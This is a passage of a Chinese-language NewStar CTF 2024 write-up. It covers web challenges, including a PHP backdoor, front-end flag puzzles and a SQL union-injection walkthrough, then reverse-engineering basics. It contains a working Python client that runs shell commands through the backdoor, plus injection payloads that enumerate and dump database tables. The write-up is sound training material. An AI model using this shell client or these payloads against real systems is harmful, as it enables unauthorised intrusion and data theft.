newstar_zhixieweiji&quot;</span>)</span><br><span class="line"><span class="comment"># 定义url和cmd</span></span><br><span class="line">url = <span class="string">&quot;http://yourtarget.com/backd0or.php&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line"><span class="comment">#cmd base64编码</span></span><br><span class="line">cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"><span class="comment">#翻转cmd的base64编码</span></span><br><span class="line">cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#md5编码翻转cmd的base64编码</span></span><br><span class="line">hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line"><span class="comment">#base64编码得key</span></span><br><span class="line">encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方代码 shell交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Shell for newstar_zhixieweiji&quot;</span>)</span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter the target URL: &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># cmd base64编码</span></span><br><span class="line">    cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 翻转</span></span><br><span class="line">    cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># md5</span></span><br><span class="line">    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># base64得key</span></span><br><span class="line">    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 构造请求的payload</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,<span class="string">&#x27;key&#x27;</span>: encoded_key&#125;</span><br><span class="line">    <span class="comment"># 发送post，获得响应</span></span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    <span class="comment"># 返回响应并去掉最后一个字符</span></span><br><span class="line">    <span class="keyword">return</span> response.text[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 获得目标主机名</span></span><br><span class="line">hostname = execute_command(<span class="string">&quot;hostname&quot;</span>)</span><br><span class="line"><span class="comment"># 获得用户名</span></span><br><span class="line">username = execute_command(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># 无限循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 获得当前目录</span></span><br><span class="line">    directory = execute_command(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">    <span class="comment"># 输入指令</span></span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">f&quot;<span class="subst">&#123;username&#125;</span>@<span class="subst">&#123;hostname&#125;</span>:<span class="subst">&#123;directory&#125;</span>$ &quot;</span>)</span><br><span class="line">    <span class="comment"># 发送指令</span></span><br><span class="line">    output = execute_command(command)</span><br><span class="line">    <span class="comment"># 打印输出</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
+<h4 id="会赢吗">会赢吗</h4>
+<p><s>分尸题太 ex 了</s></p>
+<p>flag 被分为多段。</p>
+<h5 id="flag1">flag1</h5>
+<p>通过开发者工具可以得到，并且给出了第二段的 url</p>
+<h5 id="flag2">flag2</h5>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span></span><br><span class="line"><span class="language-javascript">          <span class="string">`恭喜你！你获得了第二部分的 flag: <span class="subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">        );</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败，请检查输入或服务器响应。&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求过程中出现错误:&quot;</span>, error);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 控制台提示</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据提示，有两种思路</p>
+<ol>
+<li class="lvl-3">
+<p>在控制台执行 revealFlag(‘4cqu1siti0n’)即可</p>
+</li>
+<li class="lvl-3">
+<p>发送 post 请求，请求头包含’Content-Type’: ‘application/json’</p>
+</li>
+</ol>
+<h5 id="flag3">flag3</h5>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;seal_him&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> stateElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;state&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> messageElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&quot;解封&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        messageElement.<span class="property">textContent</span> = <span class="string">&quot;如何是好？&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/flag/s34l&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">csrf_token</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf_token&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">          &#125;),</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">          messageElement.<span class="property">textContent</span> = <span class="string">`第三部分Flag: <span class="subst">$&#123;</span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-javascript">            data.flag</span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-javascript">          &#125;</span>, 你解救了五条悟！下一关: /<span class="subst">$&#123;data.nextLevel || <span class="string">&quot;无&quot;</span>&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          messageElement.<span class="property">textContent</span> = <span class="string">&quot;请求失败，请重试。&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">        messageElement.<span class="property">textContent</span> = <span class="string">&quot;请求过程中出现错误，请重试。&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里仍然有多种解决方案</p>
+<ol>
+<li class="lvl-3">
+<p>发送 post 请求</p>
+</li>
+<li class="lvl-3">
+<p>修改前端</p>
+</li>
+</ol>
+<h5 id="flag4">flag4</h5>
+<p>同样是根据源码发送请求，也可以根据源码提示 <code>&lt;noscript&gt;</code> 禁用 js，可以使用浏览器插件，也可以改浏览器设置。</p>
+<h5 id="end">end</h5>
+<p>最后将所有 flag 拼起来，base64 解密即可</p>
+<h4 id="谢谢皮蛋">谢谢皮蛋</h4>
+<p>这是一个 sql 联合注入题</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fly_enum/article/details/135307756">【超详细版】SQL 注入原理及思路绕过(看这篇就够了)-CSDN 博客</a></p>
+<p>根据源码提示到 <code>/hint.php</code> 寻找线索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT uname,position FROM hexo WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">或许你可以了解下联合注入</span><br></pre></td></tr></table></figure>
+<p>注意 hint.php 中的 <code>LIMIT 0,1</code> ，说明只返回一行数据</p>
+<p>注入一般步骤：</p>
+<ol>
+<li class="lvl-3">
+<p>判断注入点</p>
+</li>
+<li class="lvl-3">
+<p>判断闭合形式</p>
+</li>
+<li class="lvl-3">
+<p>判断可查询的属性数</p>
+</li>
+<li class="lvl-3">
+<p>判断回显位</p>
+</li>
+<li class="lvl-3">
+<p>获取数据库名</p>
+</li>
+<li class="lvl-3">
+<p>获取表名</p>
+</li>
+<li class="lvl-3">
+<p>获取某表所有列名</p>
+</li>
+<li class="lvl-3">
+<p>获取数据</p>
+</li>
+</ol>
+<h5 id="注入点">注入点</h5>
+<p>目标网址只有一个表单，而且 url 不变，很容易判断注入点就是输入栏</p>
+<h5 id="闭合形式">闭合形式</h5>
+<p>sql 有 <code>数字型</code>和 <code>字符型</code>，闭合方式有 <code>整形</code> | <code>'</code> | <code>''</code> 三种形式</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>回显是否正常</th>
+<th>闭合方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1&quot; and “1”=&quot;1</td>
+<td>正常</td>
+<td>‘’ 形</td>
+</tr>
+<tr>
+<td>1’ and ‘1’='1</td>
+<td>正常</td>
+<td>’ 形</td>
+</tr>
+<tr>
+<td>1 and 1 = 1</td>
+<td>正常</td>
+<td>整形</td>
+</tr>
+</tbody>
+</table>
+<p>尝试后发现为整形</p>
+<h5 id="判断可查询的属性列数">判断可查询的属性列数</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n #</span><br></pre></td></tr></table></figure>
+<p>这里 <code>1</code> 为整形输入，<code>order by</code> 为 sql 语句，用于根据指定的列(n)对结果集进行排序。</p>
+<p>注意到最后有一个 <code>#</code> 符号，这是 sql 中注释符号，表示从此开始后面的内容都被注释掉，从而保证注入语句能被执行。注释符号有很多种：</p>
+<ol>
+<li class="lvl-3">
+<p>双横线单行注释 <code>--</code></p>
+</li>
+<li class="lvl-3">
+<p>井号单行注释 <code>#</code></p>
+</li>
+<li class="lvl-3">
+<p>斜杠星号多行注释 <code>/*...*/</code></p>
+</li>
+</ol>
+<p>举个例子，假设下面是数据库一个表</p>
+<table>
+<thead>
+<tr>
+<th>Country</th>
+<th>2023_GDP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>China</td>
+<td>176620</td>
+</tr>
+<tr>
+<td>American</td>
+<td>273578</td>
+</tr>
+<tr>
+<td>Germany</td>
+<td>44574</td>
+</tr>
+</tbody>
+</table>
+<p>可以看到，如果按照 GDP 降序，中国应该在美国后面。如果按照 GDP 升序，德国应该在中国前面。下面使用 <code>order by</code> 分别进行操作</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2023</span>_GDP (<span class="keyword">ASC</span>)	→ 按照<span class="number">2023</span>_GDP列使用升序排序,<span class="keyword">ASC</span>可省略</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2023</span>_GDP <span class="keyword">DESC</span>  → 按照<span class="number">2023</span>_GDP列使用降序排序</span><br></pre></td></tr></table></figure>
+<p>而上述 <code>1 order by n</code> 中的 n ，代指第 n 列，比如上述 GDP 例子，可以将语句中的 2023_GDP 换为 2</p>
+<p>如果 n 超出了最大列数，就会报错，所以可以依据报错得到最大列数</p>
+<p>在此题中，最大列数为 2</p>
+<h5 id="判断回显位">判断回显位</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> ,....,n #</span><br></pre></td></tr></table></figure>
+<p>其中 n 为最大列数</p>
+<p>UNION 的作用是将 select 查询结果合并</p>
+<p>这里注意到语句中使用了-1 而不是 1。这是因为在 hint.php 中 LIMIT 0,1 提示了只返回一条数据，在展示数据的时候只会取结果集的第一行数据。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要传入-1，让第一行查询的结果是空集，即 union 左边的 select 子句查询结果为空，那么 union 右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<h5 id="查看当前页面数据库">查看当前页面数据库</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br></pre></td></tr></table></figure>
+<p>database()为显示当前数据库的函数</p>
+<h5 id="获取表名">获取表名</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure>
+<p>很长的一个句子，下面对这个句子拆分，<code>-1 union select 1,</code> 部分和前面一样。 <code>group_concat()</code> 代指一次性显示，<code>table_name</code> 表示表名，组合在一起成为一个聚合函数，将所有表名连接成一个字符串，表名之间用逗号分隔。</p>
+<p><code>from information_schema.tables</code> 中，from 指定了从 information_schema.tables 表选择数据，而 information_schema.tables 是一个系统表，包含数据库所有<strong>表</strong>的信息。</p>
+<p><code>where table_schema=database()</code> 中，where 用于过滤查询结果，table_schema=database()是一个条件，表示只选择当前数据库中的表，database()和上一步一样，表示当前数据库</p>
+<h5 id="获取列名">获取列名</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;Fl4g&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure>
+<p>也是一个很长的句子，与上一个句子不同的是，表名 table_name 换成了 列名 <code>column_name</code>。</p>
+<p><code>information_schema.columns</code> 是一个系统表，包含数据库中所有<strong>列</strong>的信息</p>
+<p><code>where table_name='Fl4g' and table_schema=database()#</code> 同样是过滤，筛选出来当前数据库下名为 Fl4g 的表，Fl4g 是上一步获得的表名。</p>
+<h5 id="获取数据">获取数据</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#分别查询版：</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, id <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, des <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="keyword">value</span> <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"></span><br><span class="line">#三合一版(实际上是二合一)：</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(des),group_concat(<span class="keyword">value</span>) <span class="keyword">from</span> Fl4g#</span><br></pre></td></tr></table></figure>
+<h4 id="PangBai-过家家-1">* PangBai 过家家(1)</h4>
+<p>算是 week1 web 中最难的一道题了，我在 week1 时候也没能解出来。</p>
+<blockquote>
+<p>题目开源：<a target="_blank" rel="noopener" href="https://github.com/cnily03-hive/PangBai-HTTP">https://github.com/cnily03-hive/PangBai-HTTP</a></p>
+</blockquote>
+<h5 id="序章">序章</h5>
+<p>动画情节，可以等一会自动开第一关，也可以手动 <code>/start</code> 进入第一关</p>
+<h5 id="第一关">第一关</h5>
+<p>页面提示 <code>Header</code> 有线索，查看开发者工具中的网络项的响应标头，在 Location 字段发现第二关路径</p>
+<h5 id="第二关">第二关</h5>
+<p>题目提示了「Query」和 <code>ask=miao</code>，其中「Query」指的就是 GET 请求的请求参数，在 URL 中路径后面 <code>?</code> 开始就是查询字段，用 <code>&amp;</code> 分隔，遇到特殊字符需要进行 URL Encode 转义。因此我们访问路径 <code>/?ask=miao</code> 即可进入下一关</p>
+<h5 id="第三关">第三关</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用另一种方法（Method）打声招呼（say=hello）吧 ~</span><br></pre></td></tr></table></figure>
+<p>常见的除了 get 请求，还有 post 请求。用 post 请求发送 say=hello</p>
+<h5 id="第四关-→end">第四关 →end</h5>
+<p><a target="_blank" rel="noopener" href="https://ns.openctf.net/wp/2024/week1/web/pangbai1.html#%E7%AC%AC%E5%9B%9B%E5%85%B3">PangBai 过家家（1） | WriteUp - NewStar CTF 2024 (openctf.net)</a></p>
+<h3 id="Reverse">Reverse</h3>
+<p>主要考察了 IDA、jadx 等逆向工具的使用</p>
+<p>建议先熟悉 IDA 快捷键，下面是高频使用的几个快捷键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shift+f12	查看所有字符串</span><br><span class="line">x			查看引用</span><br><span class="line">a			数据转换为字符</span><br><span class="line">f5			汇编转伪代码</span><br><span class="line">n			修改变量名</span><br><span class="line">esc			返回</span><br><span class="line">ctrl+滚轮		调整流程图视图</span><br></pre></td></tr></table></figure>
+<h4 id="begin">begin</h4>
+<p><a target="_blank" rel="noopener" href="https://hex-rays.com/ida-free#download">IDA</a>入门教程，集中使用上述快捷键，剩下的就是眼力</p>
+<h4 id="base64">base64</h4>
+<p><s>出题人不会简简单单考 base64 的，总会刷着花样搞</s></p>
+<p>shift+f12 一路找到关键函数<br>
+<img src="https://ns.openctf.net/assets/base64_4.Da4eP09W.png" alt="img"></p>
+<p>base64 编码有以下特点</p>
+<blockquote>
+<p>* 字符串只可能包含 A-Z，a-z，0-9，+，/，=字符 * 字符串长度是 4 的倍数 * =只会出现在字符串最后，可能没有或者一个等号或者两个等号</p>
+</blockquote>
+<p>所以此题 base64 编码内容便是第九行末尾那一串了</p>
+<p>但是将这一串丢到常规在线工具中，得到的却不是 flag。说明题目将 base64 魔改了。一般是将 base64 换表了</p>
+<p>base64 标准码表是 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p>
+<p>这里换成了 <code>WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</code></p>
+<p>可以使用一款非常好用的在线工具 <code>CyberChef</code> 进行解密</p>
+<p><img src="https://ns.openctf.net/assets/base64_6.D7V0so-t.png" alt="CyberChef"></p>
+<p>也可以搓一个脚本，专门用来自定义 base64 解密，以后遇到的时候可以把编码内容和表丢进去直接用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded_str, custom_charset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用自定义字符集进行 Base64 解码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 标准 Base64 字符集</span></span><br><span class="line">    standard_charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 创建字符映射表</span></span><br><span class="line">    decode_table = <span class="built_in">str</span>.maketrans(custom_charset, standard_charset)</span><br><span class="line">    <span class="comment"># 将自定义字符集的编码字符串转换为标准 Base64 字符集</span></span><br><span class="line">    standard_encoded_str = encoded_str.translate(decode_table)</span><br><span class="line">    <span class="comment"># 使用标准 Base64 解码</span></span><br><span class="line">    decoded_bytes = base64.b64decode(standard_encoded_str)</span><br><span class="line">    <span class="comment"># 将解码后的字节转换为字符串</span></span><br><span class="line">    decoded_str = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decoded_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 自定义 Base64 字符集，改为上面的标准字符集就可以解码标准 base64 了</span></span><br><span class="line">    custom_charset = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 给定的 Base64 编码字符串</span></span><br><span class="line">    encoded_str = <span class="string">&quot;LgkNCxQ0WhMJVnhUDUFdYlxLQQEqUQ1BX25bE0FcK1wODQsxC0dUUn4YYQ==&quot;</span></span><br><span class="line">    <span class="comment"># 使用自定义字符集进行 Base64 解码</span></span><br><span class="line">    decoded_str = custom_base64_decode(encoded_str, custom_charset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码后的字符串:&quot;</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h4 id="ezAndroidStudy">ezAndroidStudy</h4>
+<p>用到了<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx">jadx</a>工具，一款专门用于安卓反编译的工具。手机安装好后跟着引导一步步走即可</p>
+<h4 id="Simple-encryption">Simple_encryption</h4>
